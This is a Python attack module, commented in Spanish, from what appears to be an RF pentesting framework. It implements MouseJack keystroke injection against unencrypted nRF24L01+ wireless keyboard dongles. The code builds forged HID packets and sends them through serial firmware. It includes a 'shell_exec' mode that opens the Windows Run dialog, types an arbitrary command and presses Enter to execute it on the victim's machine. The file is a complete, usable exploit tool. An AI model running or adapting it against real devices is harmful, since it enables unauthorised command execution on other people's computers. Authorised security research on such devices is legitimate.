"""
RF — nRF24L01+ ESB Spoofer / MouseJack Keystroke Injector
══════════════════════════════════════════════════════════
Requiere el firmware personalizado `nrf24-sniffer` (CC1352P7) con soporte TX.
Ver firmware/nrf24_sniffer_cc1352p7/README.md para compilar y flashear.

MouseJack (CVE-2016-10025 a CVE-2016-10031)
────────────────────────────────────────────
Vulnerabilidad descubierta por Bastille Research (Marc Newlin, 2016).
Afecta a teclados y ratones inalámbricos que usan nRF24L01+ sin cifrado ni
autenticación en sus paquetes Enhanced ShockBurst.

Técnica de ataque
─────────────────
1. Conocer la dirección RF del dongle receptor (de un sniff previo)
2. Construir un paquete ESB con esa dirección como origen
3. Incluir un payload HID forjado (teclado, ratón)
4. El dongle acepta el paquete como legítimo (sin verificación)
5. El PC procesa el keystroke/movimiento como si viniese del periférico real

Formatos de payload HID soportados
────────────────────────────────────
  null        — Paquete ESB vacío (ACK flood / DoS de presencia)
  keystroke   — Inyección de tecla (modifier + HID keycode)
  string      — Secuencia de caracteres ASCII (tecla a tecla)
  raw         — Payload personalizado en bytes hex

Comandos UART utilizados (→ firmware)
──────────────────────────────────────
  TX:ADDR_HEX:PAYLOAD_HEX\\r\\n
    ADDR_HEX     = 5 bytes en hex (10 chars), dirección del dongle
    PAYLOAD_HEX  = 0-32 bytes en hex, reporte HID

Comandos informativos del firmware (←)
────────────────────────────────────────
  [TX] OK addr=... plen=... flen=...
  [TX] ERR ...
  [CMD] ...
"""

from __future__ import annotations

import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import serial
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from attacks.base import BaseAttack, AttackOption
from attacks.registry import AttackRegistry
from core import ui as UI
from core.firmware import flash_firmware

console = Console()

# ── Mapas HID ────────────────────────────────────────────────────────────────

# HID Usage IDs para teclado US QWERTY (HID Keyboard/Keypad Page 0x07)
_HID_KEYS: dict[str, int] = {
    "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08,
    "f": 0x09, "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D,
    "k": 0x0E, "l": 0x0F, "m": 0x10, "n": 0x11, "o": 0x12,
    "p": 0x13, "q": 0x14, "r": 0x15, "s": 0x16, "t": 0x17,
    "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B, "y": 0x1C,
    "z": 0x1D,
    "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21, "5": 0x22,
    "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26, "0": 0x27,
    " ": 0x2C, "\n": 0x28, "\r": 0x28,
    ".": 0x37, ",": 0x36, "-": 0x2D, "=": 0x2E,
    "/": 0x38, ";": 0x33, "'": 0x34, "`": 0x35,
    "[": 0x2F, "]": 0x30, "\\": 0x31,
    "\t": 0x2B,
}

# Caracteres que requieren Shift (en US QWERTY)
_SHIFT_CHARS: set[str] = set(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "!@#$%^&*()_+{}|:\"<>?~"
)

# HID modifier bitmask
_MOD_LSHIFT = 0x02
_MOD_LCTRL  = 0x01
_MOD_LALT   = 0x04
_MOD_LGUI   = 0x08   # Win/Cmd key
_MOD_RSHIFT = 0x20

# Mapa de caracteres uppercase/shifted que necesitan remapping de keycode
_SHIFT_KEY_MAP: dict[str, int] = {
    "A": 0x04, "B": 0x05, "C": 0x06, "D": 0x07, "E": 0x08,
    "F": 0x09, "G": 0x0A, "H": 0x0B, "I": 0x0C, "J": 0x0D,
    "K": 0x0E, "L": 0x0F, "M": 0x10, "N": 0x11, "O": 0x12,
    "P": 0x13, "Q": 0x14, "R": 0x15, "S": 0x16, "T": 0x17,
    "U": 0x18, "V": 0x19, "W": 0x1A, "X": 0x1B, "Y": 0x1C,
    "Z": 0x1D,
    "!": 0x1E, "@": 0x1F, "#": 0x20, "$": 0x21, "%": 0x22,
    "^": 0x23, "&": 0x24, "*": 0x25, "(": 0x26, ")": 0x27,
    "_": 0x2D, "+": 0x2E, "{": 0x2F, "}": 0x30, "|": 0x31,
    ":": 0x33, "\"": 0x34, "<": 0x36, ">": 0x37, "?": 0x38,
    "~": 0x35,
}


def _char_to_hid(char: str) -> tuple[int, int]:
    """Retorna (modifier, keycode) para un carácter ASCII.
    modifier: 0 o _MOD_LSHIFT.  keycode: HID Usage ID.
    """
    if char in _SHIFT_CHARS:
        code = _SHIFT_KEY_MAP.get(char, 0x00)
        return (_MOD_LSHIFT, code)
    code = _HID_KEYS.get(char, 0x00)
    return (0x00, code)


def build_hid_keystroke(modifier: int, keycode: int) -> bytes:
    """
    Construye un reporte HID de teclado genérico para MouseJack.

    Formato de 8 bytes (Boot Protocol / Report ID-less):
      [0x00][modifier][0x00][key1][0x00][0x00][0x00][0x00]

    El dongle interpreta el byte 1 como modificadores y el byte 3
    como el keycode principal. Según el vendor el formato puede variar;
    este es el más común en dispositivos vulnerables a MouseJack.
    """
    return bytes([0x00, modifier & 0xFF, 0x00, keycode & 0xFF,
                  0x00, 0x00, 0x00, 0x00])


def build_hid_keyrelease() -> bytes:
    """Reporte de key-release: todos ceros."""
    return bytes(8)


# ── Expresiones regulares del protocolo UART del firmware ────────────────────

_TX_OK_RE  = re.compile(r"\[TX\]\s+OK\s+addr=(\S+)\s+plen=(\d+)\s+flen=(\d+)")
_TX_ERR_RE = re.compile(r"\[TX\]\s+ERR\s+(.*)")
_CMD_RE    = re.compile(r"\[CMD\]\s+(.*)")


# ── Módulo de ataque ─────────────────────────────────────────────────────────

@AttackRegistry.register
class NRF24Spoofer(BaseAttack):
    """
    nRF24L01+ ESB Spoofer — MouseJack keystroke injection / payload spoofing.

    Modos disponibles
    ─────────────────
    null       — Envía un paquete ESB vacío (null ACK). Útil para fingerprinting
                 de distancia y detección de presencia de dongle.
    keystroke  — Inyecta una única tecla con modificador opcional.
    string     — Tecla carácter a carácter una cadena ASCII completa
                 (incluye Win+R → string → Enter para ejecutar comando).
    raw        — Envía payload personalizado en bytes hex.

    Prerrequisito: ya conocer la dirección RF del dongle receptor.
    Obtenerla con el ataque nrf24_sniffer en modo PROMISC o SCAN.
    """

    name           = "nrf24_spoofer"
    description    = "nRF24L01+ ESB spoofer / MouseJack keystroke injection"
    firmware_alias = "nrf24-sniffer"   # mismo firmware que el sniffer
    category       = "RF"

    options = [
        AttackOption("flash",       "Flashear firmware antes de ejecutar (s/n)",
                     default="n",  type=str),
        AttackOption("port",        "Puerto serie del CatSniffer (e.g. /dev/ttyACM0)",
                     default="/dev/ttyACM0", type=str),
        AttackOption("baud",        "Baud rate UART",
                     default=115200, type=int),
        AttackOption("target_addr", "Dirección RF del dongle destino (hex, 5 bytes: E7E7E7E7E7)",
                     default="E7E7E7E7E7", type=str),
        AttackOption("channel",     "Canal nRF24 (0-125)",
                     default=76, type=int),
        AttackOption("mode",        "Modo: null | keystroke | string | raw",
                     default="string", type=str,
                     choices=["null", "keystroke", "string", "raw"]),
        AttackOption("key_modifier","Modificador HID (hex, e.g. 00=none, 02=Shift, 08=Win)",
                     default="00", type=str),
        AttackOption("key_code",    "HID keycode único en modo keystroke (hex, e.g. 04=a)",
                     default="04", type=str),
        AttackOption("string",      "Cadena a inyectar en modo string",
                     default="calc", type=str),
        AttackOption("shell_exec",  "Modo shell_exec: abre Win+R y escribe string como comando (s/n)",
                     default="n", type=str),
        AttackOption("payload_hex", "Payload en hex para modo raw (e.g. 0001020304)",
                     default="", type=str),
        AttackOption("delay_ms",    "Delay entre keystrokes en ms (modo string)",
                     default=80, type=int),
        AttackOption("repeat",      "Número de repeticiones del ataque (1-100)",
                     default=1, type=int),
    ]

    # ── Internals ─────────────────────────────────────────────────────────────

    def __init__(self) -> None:
        super().__init__()
        self._ser:    Optional[serial.Serial] = None
        self._lock    = threading.Lock()
        self._tx_log: list[str] = []        # log de transmisiones
        self._tx_ok   = 0
        self._tx_err  = 0

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _send_cmd(self, cmd: str) -> None:
        """Envía un comando UART al firmware (agrega \\r\\n)."""
        if self._ser and self._ser.is_open:
            self._ser.write((cmd + "\r\n").encode("ascii"))

    def _read_response(self, timeout: float = 1.0) -> str:
        """Lee hasta recibir una línea [TX] o timeout."""
        deadline = time.time() + timeout
        buf      = b""
        while time.time() < deadline:
            if self._ser and self._ser.in_waiting:
                buf += self._ser.read(self._ser.in_waiting)
                if b"\n" in buf:
                    lines  = buf.decode("ascii", errors="replace").splitlines()
                    for line in lines:
                        line = line.strip()
                        if line.startswith("[TX]") or line.startswith("[CMD]"):
                            return line
            time.sleep(0.01)
        return ""

    def _tx_esb(self, addr: str, payload: bytes) -> bool:
        """
        Envía el comando TX:ADDR:PAYLOAD_HEX al firmware.
        Retorna True si el firmware confirma OK.
        """
        payload_hex = payload.hex().upper()
        cmd = f"TX:{addr.upper()}:{payload_hex}"
        self._send_cmd(cmd)
        resp = self._read_response(timeout=1.5)
        ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        if _TX_OK_RE.search(resp):
            with self._lock:
                self._tx_ok += 1
                self._tx_log.append(f"[{ts}] OK  pld={payload_hex[:20]}{'…' if len(payload_hex)>20 else ''}")
            return True
        else:
            with self._lock:
                self._tx_err += 1
                self._tx_log.append(f"[{ts}] ERR {resp[:60]}")
            return False

    def _set_channel(self, ch: int) -> None:
        self._send_cmd(f"CH:{ch:03d}")
        time.sleep(0.05)

    # ── Payloads ─────────────────────────────────────────────────────────────

    def _run_null(self, addr: str) -> None:
        """Envía un paquete ESB vacío."""
        self._tx_esb(addr, b"")

    def _run_keystroke(self, addr: str, modifier: int, keycode: int) -> None:
        """Inyecta una sola tecla + release."""
        press   = build_hid_keystroke(modifier, keycode)
        release = build_hid_keyrelease()
        self._tx_esb(addr, press)
        time.sleep(0.01)
        self._tx_esb(addr, release)

    def _run_string(self, addr: str, text: str, delay_ms: int) -> None:
        """Inyecta una cadena carácter a carácter."""
        for char in text:
            mod, kc = _char_to_hid(char)
            if kc == 0:
                continue  # carácter no mapeado, se omite
            self._run_keystroke(addr, mod, kc)
            time.sleep(delay_ms / 1000.0)

    def _run_shell_exec(self, addr: str, command: str, delay_ms: int) -> None:
        """
        Win+R → escribe comando → Enter
        Útil para ejecutar comandos en Windows desde un teclado inalámbrico
        vulnerado con MouseJack.
        """
        # Win+R: GUI + r
        self._run_keystroke(addr, _MOD_LGUI, 0x15)  # 0x15 = 'r'
        time.sleep(0.5)   # esperar que aparezca Run dialog
        # Escribir el comando
        self._run_string(addr, command, delay_ms)
        time.sleep(0.1)
        # Enter (0x28)
        self._run_keystroke(addr, 0x00, 0x28)

    def _run_raw(self, addr: str, payload_hex: str) -> None:
        """Envía payload hex personalizado."""
        try:
            payload = bytes.fromhex(payload_hex.replace(" ", ""))
        except ValueError:
            console.print("[red]payload_hex inválido[/red]")
            return
        self._tx_esb(addr, payload)

    # ── UI ───────────────────────────────────────────────────────────────────

    def _build_panel(self, addr: str, mode: str, done: bool) -> Panel:
        table = Table(show_header=False, box=None, padding=(0, 1))
        table.add_column("k", style="bold cyan", no_wrap=True)
        table.add_column("v", style="white")

        table.add_row("Target addr", addr.upper())
        table.add_row("Channel",     str(self.get_option("channel")))
        table.add_row("Mode",        mode)
        table.add_row("TX OK",       str(self._tx_ok))
        table.add_row("TX ERR",      str(self._tx_err))
        if mode == "string" or mode == "shell_exec":
            s = self.get_option("string")
            table.add_row("String",  repr(s) if s else "(vacío)")

        # Últimas 5 líneas del log
        log_text = Text()
        with self._lock:
            recent = self._tx_log[-5:]
        for entry in recent:
            color = "green" if " OK " in entry else "red"
            log_text.append(entry + "\n", style=color)

        from rich.columns import Columns
        from rich import box as rbox
        log_table = Table(show_header=False, box=rbox.SIMPLE, padding=(0, 1))
        log_table.add_column("Log", style="dim")
        for entry in (self._tx_log[-8:] if self._tx_log else ["(esperando TX...)"]):
            color = "green" if " OK " in entry else ("red" if "ERR" in entry else "dim")
            log_table.add_row(Text(entry, style=color))

        from rich.console import Group
        body = Group(table, log_table)
        status = "[bold green]COMPLETADO[/bold green]" if done else "[bold yellow]EN CURSO[/bold yellow]"
        return Panel(body,
                     title=f"[bold red] nRF24 Spoofer / MouseJack [/bold red] {status}",
                     border_style="red")

    # ── run() ─────────────────────────────────────────────────────────────────

    def run(self, device) -> None:
        """Ejecuta el ataque de spoofing/inyección."""

        # ── Opciones ──────────────────────────────────────────────────────────
        do_flash    = self.get_option("flash").lower() in ("s", "y", "1", "si", "yes")
        port        = self.get_option("port")
        baud        = self.get_option("baud")
        addr        = self.get_option("target_addr").upper().replace(":", "").replace(" ", "")
        channel     = self.get_option("channel")
        mode        = self.get_option("mode")
        delay_ms    = self.get_option("delay_ms")
        repeat      = max(1, min(100, self.get_option("repeat")))
        shell_exec  = self.get_option("shell_exec").lower() in ("s", "y", "1", "si", "yes")

        # Validar addr
        if len(addr) not in (6, 8, 10) or not all(c in "0123456789ABCDEF" for c in addr):
            console.print(f"[red]Dirección inválida: '{addr}'. Usa formato hex, e.g. E7E7E7E7E7[/red]")
            return

        # ── Flash firmware ────────────────────────────────────────────────────
        if do_flash:
            if not flash_firmware(device, self.firmware_alias):
                return

        # ── Abrir puerto serie ────────────────────────────────────────────────
        try:
            self._ser = serial.Serial(port, baud, timeout=0.5)
        except serial.SerialException as exc:
            console.print(f"[red]No se puede abrir {port}: {exc}[/red]")
            return

        time.sleep(0.3)
        self._ser.reset_input_buffer()
        self._set_channel(channel)
        time.sleep(0.1)

        # ── Ejecutar ataque ───────────────────────────────────────────────────
        self._running = True
        try:
            with Live(self._build_panel(addr, mode, False),
                      console=console, refresh_per_second=4) as live:
                for iteration in range(repeat):
                    if not self._running:
                        break

                    if mode == "null":
                        self._run_null(addr)

                    elif mode == "keystroke":
                        try:
                            mod = int(self.get_option("key_modifier"), 16)
                            kc  = int(self.get_option("key_code"), 16)
                        except ValueError:
                            console.print("[red]key_modifier o key_code no son hex válidos[/red]")
                            break
                        self._run_keystroke(addr, mod, kc)

                    elif mode == "string":
                        text = self.get_option("string")
                        if shell_exec:
                            self._run_shell_exec(addr, text, delay_ms)
                        else:
                            self._run_string(addr, text, delay_ms)

                    elif mode == "raw":
                        self._run_raw(addr, self.get_option("payload_hex"))

                    live.update(self._build_panel(addr, mode, False))
                    time.sleep(0.05)

                live.update(self._build_panel(addr, mode, True))

        except KeyboardInterrupt:
            console.print("\n[yellow]Interrumpido por el usuario[/yellow]")
        finally:
            self._running = False
            if self._ser and self._ser.is_open:
                self._ser.close()

        console.print(
            f"\n[bold green]Ataque completado.[/bold green] "
            f"TX OK: [green]{self._tx_ok}[/green]  "
            f"TX ERR: [red]{self._tx_err}[/red]"
        )
